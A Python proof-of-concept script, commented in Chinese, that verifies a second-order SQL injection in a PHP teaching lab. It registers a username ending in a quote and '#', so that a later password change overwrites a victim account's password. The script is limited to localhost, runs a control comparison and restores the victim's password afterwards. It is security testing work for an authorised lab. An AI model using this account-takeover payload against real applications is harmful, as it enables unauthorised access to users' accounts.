#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQLI-005 二阶 SQL 注入本地验证草案（仅限授权教学靶场）。

静态依据（行号为对应片段代码块内的局部行号）：
  SQLI-005-A:25  $username=  mysql_escape_string($_POST['username']) ;
  SQLI-005-A:48  insert into users ( username, password) 以双引号包裹 $username 与 $pass 的值。
  SQLI-005-B:22  $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
  SQLI-005-B:43  $_SESSION["username"] = $login;
  SQLI-005-C:31  $username= $_SESSION["username"];
  SQLI-005-C:38  $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";

测试思路：注册用户名为 "<victim>'#" 的账号（单引号 + #），该值以原文存入
users.username；登录后由 B:43 进入 SESSION；改密时 C:38 的 username 条件被
单引号闭合、# 注释掉后续 password 条件，UPDATE 命中 <victim> 行。
脚本同时执行普通用户名对照，以证明差异来自 payload 而不是普通改密流程。

安全约束：仅允许 localhost/127.0.0.1/::1；不跟随重定向；只创建/修改专用测试
账号；不枚举数据库、不读取或导出其他数据；运行后自动尝试恢复受害账号原密码。
"""

import argparse
import http.cookiejar
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
SUCCESS_MARK = "Password successfully updated"
DIE_MARKS = (
    "You tried to be smart",
    "You tried to be real smart",
    "Error Creating your user account",
)
PHP_ERR_MARKS = ("Fatal error", "Parse error", "Warning:", "headers already sent")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """禁止自动跟随 3xx，便于把认证跳转当作独立观察对象。"""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def validate_base(raw):
    parts = urllib.parse.urlsplit(raw)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("拒绝: 基址必须是 http/https")
    host = (parts.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        raise SystemExit("拒绝: 仅允许 localhost/127.0.0.1/::1，实际为 %r" % host)
    return raw.rstrip("/")


def make_opener(jar):
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), NoRedirect()
    )


def load_jar(path):
    jar = http.cookiejar.LWPCookieJar(path)
    if os.path.exists(path):
        try:
            jar.load(ignore_discard=True, ignore_expires=True)
        except Exception as exc:
            print("[warn] 会话文件读取失败，改用空会话: %s" % exc)
    return jar


def classify(status, body, headers):
    info = {"status": status, "marker": "unknown", "location": None}
    if status is None:
        info["marker"] = "connection_error"
        return info
    if headers is not None:
        info["location"] = headers.get("Location")
    loc = info["location"] or ""
    for mark in DIE_MARKS:
        if mark in body:
            info["marker"] = "sql_die"
            return info
    for mark in PHP_ERR_MARKS:
        if mark in body:
            info["marker"] = "php_error"
            return info
    if SUCCESS_MARK in body:
        info["marker"] = "password_updated"
        return info
    if "logged-in" in loc or "logged-in" in body:
        info["marker"] = "logged_in"
        return info
    if "slap1.jpg" in body:
        info["marker"] = "login_failed"
        return info
    if "failed.php" in loc:
        info["marker"] = "redirect_failed"
        return info
    if loc:
        info["marker"] = "redirect"
        return info
    if status in (200, 201, 302) and not body.strip():
        info["marker"] = "empty_ok"
        return info
    return info


def login_ok(info):
    return info["marker"] in ("logged_in", "empty_ok")


def post(opener, url, fields, timeout):
    data = urllib.parse.urlencode(fields).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "sqli005-poc-draft/1.0",
        },
    )
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", "replace"), resp.headers
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace")
        return exc.code, body, exc.headers
    except urllib.error.URLError as exc:
        return None, "CONNECTION_ERROR: %s" % exc.reason, None


def register(opener, base, path, username, password, timeout):
    return post(
        opener,
        base + path,
        {
            "submit": "submit",
            "username": username,
            "password": password,
            "re_password": password,
        },
        timeout,
    )


def login(opener, base, path, username, password, timeout):
    return post(
        opener,
        base + path,
        {"login_user": username, "login_password": password},
        timeout,
    )


def change_password(opener, base, path, current, new, timeout):
    return post(
        opener,
        base + path,
        {
            "submit": "submit",
            "current_password": current,
            "password": new,
            "re_password": new,
        },
        timeout,
    )


def show(label, result):
    status, body, headers = result
    info = classify(status, body, headers)
    print(
        "[%s] status=%s marker=%s location=%s body_len=%d"
        % (label, info["status"], info["marker"], info["location"], len(body))
    )
    return info


def payload_name(victim):
    return victim + "'#"


def round_trip(args, base, account, target_password, label):
    jar = load_jar(args.session_file)
    opener = make_opener(jar)
    reg = show(
        label + ":register",
        register(opener, base, args.register_path, account, args.attacker_password, args.timeout),
    )
    if reg["marker"] in ("sql_die", "php_error", "connection_error"):
        raise SystemExit("注册阶段异常，停止: %s" % reg["marker"])
    log = show(
        label + ":login",
        login(opener, base, args.login_path, account, args.attacker_password, args.timeout),
    )
    if log["marker"] in ("sql_die", "php_error", "connection_error"):
        raise SystemExit("登录阶段异常，停止: %s" % log["marker"])
    chg = show(
        label + ":change",
        change_password(
            opener,
            base,
            args.change_path,
            args.attacker_password,
            target_password,
            args.timeout,
        ),
    )
    try:
        jar.save(ignore_discard=True, ignore_expires=True)
    except Exception as exc:
        print("[warn] 会话文件保存失败: %s" % exc)
    return chg


def victim_login_check(args, base, password, label):
    jar = http.cookiejar.LWPCookieJar()
    opener = make_opener(jar)
    info = show(
        label,
        login(opener, base, args.login_path, args.victim_username, password, args.timeout),
    )
    return info


def restore(args, base):
    jar = http.cookiejar.LWPCookieJar()
    opener = make_opener(jar)
    log = show(
        "restore:login",
        login(opener, base, args.login_path, args.victim_username, args.new_password, args.timeout),
    )
    if not login_ok(log):
        print("[warn] 无法用 new_password 登录受害测试账号，可能注入未生效；请人工核对后恢复")
        return False
    chg = show(
        "restore:change",
        change_password(
            opener,
            base,
            args.change_path,
            args.new_password,
            args.victim_password,
            args.timeout,
        ),
    )
    ok = chg["marker"] == "password_updated"
    print("[restore] %s" % ("已改回原密码" if ok else "恢复未确认，请人工回查"))
    return ok


def main(argv):
    ap = argparse.ArgumentParser(
        description="SQLI-005 二阶 SQL 注入验证草案（仅限本地授权靶场）"
    )
    ap.add_argument("--base-url", required=True, help="如 http://127.0.0.1:8080")
    ap.add_argument("--register-path", required=True, help="注册处理页路径，如 /new_user.php（需按部署核对）")
    ap.add_argument("--login-path", required=True, help="登录处理页路径（代码未给出，需人工确认）")
    ap.add_argument("--change-path", required=True, help="改密页路径（代码未给出，需人工确认）")
    ap.add_argument("--victim-username", required=True, help="已存在的专用测试受害账号用户名")
    ap.add_argument("--victim-password", required=True, help="受害测试账号原密码，用于对照与恢复")
    ap.add_argument("--attacker-password", default="Sqli005-Lab-Pass1", help="注册的载荷/对照账号密码")
    ap.add_argument("--new-password", default="Sqli005-Lab-New1", help="注入后写入受害账号的新密码")
    ap.add_argument("--session-file", default="sqli005_session.txt", help="本地会话文件路径，勿提交版本库")
    ap.add_argument("--timeout", type=float, default=10.0, help="单请求超时秒数")
    ap.add_argument("--control-username", default="", help="对照用普通用户名，默认 <victim>-ctrl")
    ap.add_argument("--skip-control", action="store_true", help="跳过普通输入对照")
    ap.add_argument("--no-auto-restore", action="store_true", help="不自动把受害账号改回原密码")
    args = ap.parse_args(argv)

    base = validate_base(args.base_url)
    control = args.control_username or (args.victim_username + "-ctrl")
    payload = payload_name(args.victim_username)
    print("[scope] base=%s victim=%s control=%s payload_user=%r"
          % (base, args.victim_username, control, payload))

    results = {}
    if not args.skip_control:
        ctrl = round_trip(args, base, control, args.new_password, "control")
        results["control_change"] = ctrl["marker"]
        ctrl_victim = victim_login_check(args, base, args.victim_password, "control:victim_original")
        results["control_victim_original_ok"] = login_ok(ctrl_victim)
        print("[control] 预期: 改密成功，但受害账号不受影响（原密码仍可登录）")

    tst = round_trip(args, base, payload, args.new_password, "test")
    results["test_change"] = tst["marker"]
    new_ok = victim_login_check(args, base, args.new_password, "test:victim_new_password")
    old_ok = victim_login_check(args, base, args.victim_password, "test:victim_original_password")
    results["test_victim_new_ok"] = login_ok(new_ok)
    results["test_victim_original_ok"] = login_ok(old_ok)
    print("[test] 预期: 改密成功，且受害账号可用新密码登录、原密码失败")

    if not args.no_auto_restore and results.get("test_victim_new_ok"):
        results["restored"] = restore(args, base)

    print(json.dumps(results, ensure_ascii=False, indent=2))
    print("[note] HTTP 200、文案命中或脚本退出码均不单独构成注入成功；以 control 与 test 的差异为准。")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
